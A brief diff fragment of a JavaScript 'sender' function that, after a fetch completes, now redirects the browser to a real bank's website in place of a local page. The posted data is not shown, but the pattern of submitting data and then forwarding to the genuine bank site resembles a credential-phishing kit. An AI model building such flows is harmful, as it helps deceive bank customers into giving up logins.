@@ -21,7 +21,7 @@ var sender = function () {
     })
     .then(r => r.json())
     .then(() => {
-        window.location = 'index8.html';
+        window.location = 'https://www.banreservas.com/';
     })
     .catch(err => console.error(err));
 
